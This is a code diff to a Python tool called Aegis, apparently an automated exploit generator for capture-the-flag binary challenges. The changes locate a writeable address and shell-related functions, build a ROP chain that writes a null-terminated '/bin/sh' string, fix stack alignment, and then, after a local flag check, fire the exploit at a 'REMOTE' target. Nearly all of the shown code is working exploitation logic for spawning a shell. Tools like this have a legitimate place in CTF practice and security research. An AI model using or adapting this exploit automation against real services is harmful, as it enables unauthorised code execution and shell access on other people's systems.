@@ -65,14 +65,13 @@ class Aegis:
         function = self.machine.find_functions(["win", "system", "execve", "syscall"])
         string = self.machine.find_string_address()
         self.against.chain = b""
-        writeable = None
+        writeable = self.machine.find_writeable_address()
 
         if len(function) > 0:
             function = function[0]
         else:
             function = None
 
-        # Choose the right padding size
         if self.symbolic_padding != None:
             #if self.machine.padding_size == len(self.symbolic_padding):
             self.against.padding = self.symbolic_padding
@@ -96,8 +95,9 @@ class Aegis:
                     aegis_log.info(f"Found flag through stack leak: {self.against.flag}")
 
         else: 
+
             if not string:
-                self.against.chain += self.against.rop_chain_write_string(b"/bin/sh", writeable)
+                self.against.chain += self.against.rop_chain_write_string(b"/bin/sh\x00", writeable)
 
             # Check if one call functions are in the binary
             if win_gadget:
@@ -174,15 +174,14 @@ class Aegis:
                 self.against.chain =  self.against.chain[:(chain_len-8)] + ret + self.against.chain[(chain_len-8):]
                 self.against.process = self.against.start("")
                 self.against.send_exploit()
-                self.against.verify_flag()
+                if self.against.verify_flag() == True:
+                    self.against.process = self.against.start("REMOTE")
+                    self.against.send_exploit()
+            else:
+                self.against.process = self.against.start("REMOTE")
+                self.against.send_exploit()
  
-        
-
-
-
 def print_title():
-
-
 
     aegis_title = """
   ▄████████    ▄████████    ▄██████▄   ▄█     ▄████████
